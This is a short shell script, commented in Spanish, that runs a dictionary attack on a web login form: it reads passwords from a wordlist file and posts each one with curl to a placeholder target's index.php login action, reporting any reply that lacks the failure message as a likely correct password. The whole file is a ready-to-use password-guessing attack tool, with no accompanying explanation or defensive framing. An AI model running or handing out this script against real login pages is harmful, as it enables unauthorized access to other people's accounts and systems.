#!/bin/sh

# Verificar que se haya pasado al menos un parámetro
if [ $# -eq 0 ]; then
    echo "Uso: $0 <diccionario>"
    exit 1
fi

# Nombre del archivo de texto (el primer parámetro)
archivo="$1"

# URL del endpoint donde enviar la solicitud POST
url="http://<IP_OBJETIVO>:<PUERTO_OBJETIVO>/index.php?action=login"

# Contador de contraseñas comprobadas
contador=0

# Recorrer el archivo de texto línea por línea
while IFS= read -r linea
do
  # Utilizar cURL para enviar una solicitud POST con la contraseña actual
  respuesta=$(curl -s -X POST \
    -d "username=<usuario>" \
    -d "password=$linea" \
    "$url")
    
  # Incrementar el contador de contraseñas comprobadas
  contador=$((contador+1))

  # Imprimir el valor actual del contador cada 100 contraseñas
  if [ $((contador % 100)) -eq 0 ]; then
    echo "$contador contraseñas comprobadas"
  fi
  
  cont_patron=$(echo "$respuesta" | grep -c "Usuario o contraseña incorrectas")

  # Verificar si la respuesta NO contiene la frase "usuario o contraseña incorrectas"
  if [ "$cont_patron" -eq 0 ]; then
    echo "Posible contraseña correcta: $linea"
  fi
done < "$archivo"
